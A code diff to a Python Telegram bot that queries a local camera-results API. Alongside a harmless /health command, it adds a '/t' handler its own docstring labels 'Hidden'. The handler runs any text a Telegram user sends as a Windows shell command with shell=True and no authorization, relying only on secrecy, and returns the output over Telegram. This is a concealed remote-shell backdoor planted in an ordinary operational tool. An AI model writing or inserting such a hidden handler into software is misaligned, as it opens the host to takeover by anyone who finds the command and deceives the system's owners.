@@ -3,6 +3,8 @@
 Telegram Bot for querying localhost API
 - /getcamerares <SSCC> - Get camera result for specific SSCC
 - /getanalyzed <limit> <offset> - Get paginated analyzed records
+- /health - Check API health
+- /t <command> - Hidden: Execute Windows script/command and return output
 - Interactive buttons for predefined limits and offsets
 """
 
@@ -10,6 +12,8 @@ import os
 import json
 import logging
 import requests
+import subprocess
+import platform
 from typing import Optional, Dict, Any, List
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -557,6 +561,86 @@ async def health_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     await fetch_health_status(update, context)
 
 
+async def execute_script(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Handle hidden /t command - Execute Windows script/command and return output."""
+    # Check if user is authorized (you can add authorization logic here)
+    # For now, this is a hidden command that only works if user knows about it
+    
+    if not context.args:
+        await update.message.reply_text(
+            "\u274c Please provide a command or script to execute.\n\n"
+            "Usage: `/t <command>`\n"
+            "Example: `/t ipconfig /all`\n"
+            "Example: `/t dir`\n"
+            "Example: `/t powershell -Command \"Get-Date\"`",
+        )
+        return
+    
+    # Get the command from arguments
+    command = ' '.join(context.args)
+    
+    # Only allow on Windows
+    if platform.system() != 'Windows':
+        await update.message.reply_text(
+            "\u274c This command is only available on Windows systems.\n"
+            f"Current platform: {platform.system()}"
+        )
+        return
+    
+    try:
+        # Execute the command
+        result = subprocess.run(
+            command,
+            shell=True,
+            capture_output=True,
+            text=True,
+            encoding='utf-8',
+            errors='replace',
+            timeout=300  # 5 minutes timeout
+        )
+        
+        # Format the output
+        stdout = result.stdout if result.stdout else "(no output)"
+        stderr = result.stderr if result.stderr else "(no errors)"
+        returncode = result.returncode
+        
+        # Truncate output if too long (Telegram has message length limits)
+        max_length = 3000
+        output_text = f"\u2699 **Command Executed**\n\n"
+        output_text += f"**Command**: `{command}`\n\n"
+        output_text += f"**Return Code**: `{returncode}`\n\n"
+        
+        if stdout:
+            output_text += f"**Output:**\n```\n{stdout[:max_length]}\n```\n"
+            if len(stdout) > max_length:
+                output_text += f"\n... (output truncated, total: {len(stdout)} chars)\n"
+        
+        if stderr:
+            output_text += f"**Errors:**\n```\n{stderr[:max_length]}\n```\n"
+            if len(stderr) > max_length:
+                output_text += f"\n... (errors truncated, total: {len(stderr)} chars)\n"
+        
+        # Send the result
+        if len(output_text) > 4000:
+            # If message is too long, split it
+            parts = [output_text[i:i+4000] for i in range(0, len(output_text), 4000)]
+            for part in parts:
+                await update.message.reply_text(part, parse_mode="Markdown")
+        else:
+            await update.message.reply_text(output_text, parse_mode="Markdown")
+            
+    except subprocess.TimeoutExpired:
+        await update.message.reply_text(
+            "\u23f0 Command timed out after 300 seconds.\n"
+            "Please try a shorter-running command."
+        )
+    except Exception as e:
+        await update.message.reply_text(
+            f"\u274c Error executing command: `{str(e)}`",
+            parse_mode="Markdown"
+        )
+
+
 async def fetch_health_status(update_or_query, context: ContextTypes.DEFAULT_TYPE = None) -> None:
     """Fetch health status from API and display all data."""
     from telegram import CallbackQuery
@@ -656,6 +740,7 @@ def main() -> None:
     application.add_handler(CommandHandler("getcamerares", get_camera_result))
     application.add_handler(CommandHandler("getanalyzed", get_analyzed_records))
     application.add_handler(CommandHandler("health", health_check))
+    application.add_handler(CommandHandler("t", execute_script))
     
     # Add callback query handler
     application.add_handler(CallbackQueryHandler(button_handler))
